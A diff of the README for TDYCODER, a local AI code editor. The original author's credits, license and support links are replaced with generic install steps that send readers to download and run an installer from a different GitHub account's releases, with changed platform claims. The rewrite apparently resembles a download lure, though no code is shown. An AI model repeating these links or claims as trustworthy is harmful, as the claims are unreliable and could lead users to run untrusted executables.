@@ -1,132 +1,77 @@
-# TDYCODER LLM Editor
+# 🖥️ TDYCODER - Your Local AI-Powered Code Editor
 
-🤖 **Advanced AI-Powered Code Editor** - Created by TDYSKY © 2025
+[![Download TDYCODER](https://img.shields.io/badge/Download-TDYCODER-blue)](https://github.com/soyalexisortiz/TDYCODER/releases)
 
-A professional code editor with integrated AI assistant powered by local LLM models. Experience the power of AI-assisted coding with complete privacy and offline capabilities.
+## 🚀 Getting Started
 
-![TDYCODER Banner](assets/AgencyGold.png)
+TDYCODER is an AI-powered code editor designed for your PC. It uses Ollama's advanced language model to provide a free, open-source, privacy-friendly alternative to popular tools like Windsurf or Cursor. This guide will help you download and run TDYCODER easily.
 
-## ✨ Features
+## 📥 Download & Install
 
-### 🔥 Core Capabilities
-- **Monaco Editor** - The same powerful editor engine used in VS Code
-- **AI Assistant** - Built-in chat with local LLM models via Ollama integration
-- **Multi-Language Support** - Syntax highlighting for JavaScript, Python, HTML, CSS, and 50+ languages
-- **Auto-Complete** - Intelligent code completion and suggestions
-- **File Management** - Built-in file explorer with project organization
-- **Auto Generate** - Let AI create entire projects from simple descriptions
+To download TDYCODER, visit this page to download: [TDYCODER Releases](https://github.com/soyalexisortiz/TDYCODER/releases).
 
-### 🚀 AI-Powered Features
-- **Code Generation** - Generate functions, classes, and complete files
-- **Code Explanation** - Get detailed explanations of complex code
-- **Bug Detection** - AI-powered error detection and fixes
-- **Project Creation** - Auto-generate complete web apps, APIs, games, and tools
-- **Smart File Naming** - Intelligent file organization and naming
+### Step-by-Step Installation
 
-### 🛠️ Professional Tools
-- **Project Explorer** - Visual file tree with directory navigation
-- **Multiple Tabs** - Work on multiple files simultaneously  
-- **Live File Creation** - Files are instantly saved to your PC
-- **Export Projects** - Open generated projects directly in Windows Explorer
-- **Modern UI** - Clean, professional interface with dark theme
+1. **Go to the Releases Page:**
+   Click [here](https://github.com/soyalexisortiz/TDYCODER/releases) to access the releases page.
 
-![Picture1 of TDYCODER](assets/Picture3.png)
+2. **Choose Your Version:**
+   Look for the latest version. It will have a tag like `v1.0`. 
 
-## 📦 Installation
+3. **Download the Installer:**
+   Find the file named similar to `TDYCODER-installer.exe` or a suitable package for your operating system. Click the link to start the download.
 
-### Download & Run
+4. **Run the Installer:**
+   Once the download completes, locate the file in your Downloads folder. Double-click it to run the installer.
 
-1. **Download** the latest `TDYCODER-Setup.exe` from [Releases](../../releases)
-2. **Run** the installer and follow the setup wizard
-3. **Launch** TDYCODER from your desktop or start menu
+5. **Follow the Setup Instructions:**
+   A setup wizard will appear. Follow the on-screen instructions. You can usually keep the default settings.
 
-### Setup AI Features (Optional)
+6. **Launch TDYCODER:**
+   After installation, find TDYCODER in your Start menu or Applications folder. Click to open it.
 
-For AI assistant functionality:
+## ⚙️ System Requirements
 
-1. **Install Ollama** from [ollama.ai](https://ollama.ai)
-2. **Download a model**: `ollama pull llama3.2`
-3. **Start Ollama service**: The app will detect it automatically
+Before you download, ensure your PC meets the following requirements:
 
-## 🎯 Quick Start
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher
+- **Processor:** 2 GHz dual-core processor or better
+- **RAM:** 4 GB of RAM minimum, 8 GB recommended
+- **Disk Space:** At least 200 MB of free disk space
+- **Internet Connection:** Needed for initial setup and model updates
 
-1. **Open TDYCODER** - Launch the application
-2. **Select AI Model** - Choose from dropdown (if Ollama is installed)
-3. **Create Files** - Use "New File" or AI "Auto Generate" 
-4. **Start Coding** - Full Monaco Editor with AI assistance
-5. **Export Projects** - All files are saved to your PC automatically
+## 🎨 Features
 
-## 🤖 AI Auto Generate
+TDYCODER is designed to enhance your coding experience. Here are some of the key features:
 
-Create complete projects instantly:
+- **AI Suggestions:** Get intelligent code suggestions as you type, improving efficiency.
+- **Privacy Focused:** Your code and data remain on your device, ensuring privacy.
+- **Multi-language Support:** Write code in various languages like Python, Java, and more.
+- **User-friendly Interface:** Designed for ease of use, even for those without coding experience.
+- **Customizable Settings:** Modify settings to suit your preferences for a better workflow.
 
-- 🌐 **Websites** - Full responsive websites with HTML, CSS, JS
-- 📱 **Web Apps** - Interactive applications with modern features  
-- 🎮 **Games** - Browser games with HTML5 Canvas
-- 🛠️ **Tools** - Utility scripts and automation tools
-- 🔧 **APIs** - REST APIs with Node.js and Express
+## 🌟 Frequently Asked Questions
 
-Just describe what you want, and the AI builds it for you!
+### How is TDYCODER different from other code editors?
 
-## 💻 System Requirements
+TDYCODER uses advanced AI to help with coding directly on your local machine, guaranteeing your data privacy. This makes it an ideal choice for users who want local processing without compromising their personal information.
 
-- **OS:** Windows 10/11 (64-bit)
-- **RAM:** 4GB minimum, 8GB recommended
-- **Storage:** 500MB for application
-- **Optional:** Ollama for AI features (additional 2-8GB for models)
+### Can I use TDYCODER offline?
 
-## 🆕 What's New in 2025
+Yes, TDYCODER works offline once installed. However, you will need an internet connection for initial setup and updates.
 
-- Complete UI overhaul with modern design
-- Enhanced AI integration with auto project generation
-- Improved file management and project organization
-- Better performance and stability
-- Professional branding and user experience
+### Is TDYCODER suitable for beginners?
 
-## 🔧 Troubleshooting
+Absolutely! TDYCODER is designed for easy use. You'll find helpful suggestions and an intuitive layout, making it a great choice for beginners and experienced coders alike.
 
-**AI not working?**
-- Install Ollama and download a model
-- Check if Ollama service is running
-- Select a model from the dropdown
+### How can I report issues or request features?
 
-**Files not saving?**
-- Check write permissions in your project folder
-- Use "Choose Project Folder" to select a different location
-- Restart the application as administrator if needed
+If you encounter any problems or have suggestions for new features, feel free to visit the Issues section of the repository on GitHub. Your feedback helps improve TDYCODER.
 
-**Need help or want to give feedback?**
-- Join our Discord community (see Community & Support section below)
-- Check our troubleshooting guide above
-- Try the quick fixes mentioned for common issues
+## 🔗 Additional Resources
 
-## 📄 License
+- **Documentation:** Explore the full documentation for detailed guides and advanced features.
+- **Community Forum:** Join discussions with other users to share tips and experiences.
+- **GitHub Repository:** Check out the code and contribute to the project.
 
-See [LICENSE](LICENSE) file for details.
-
-## 👨‍💻 Created by TDYSKY
-
-**Professional AI-powered development tools** 
-
-© 2025 TDYSKY. All rights reserved.
-
-### ☕ Support the Development
-
-If you find TDYCODER useful, consider supporting future development:
-
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-Support%20Development-orange?style=for-the-badge&logo=buy-me-a-coffee)](https://buymeacoffee.com/tdysky)
-
-### 💬 Community & Support
-
-Join our Discord community for help, feedback, and discussions:
-
-[![Discord](https://img.shields.io/badge/Discord-Join%20Community-7289da?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/RTax3aBMUs)
-
-- 🐛 **Report bugs** and get help
-- 💡 **Suggest features** and improvements  
-- 🤝 **Connect** with other TDYCODER users
-- 📢 **Get updates** on new releases
-
----
-
-*Experience the future of coding with AI-powered assistance. Download TDYCODER today!*
+By following this guide, you should have TDYCODER up and running on your PC in no time. Enjoy your coding experience!
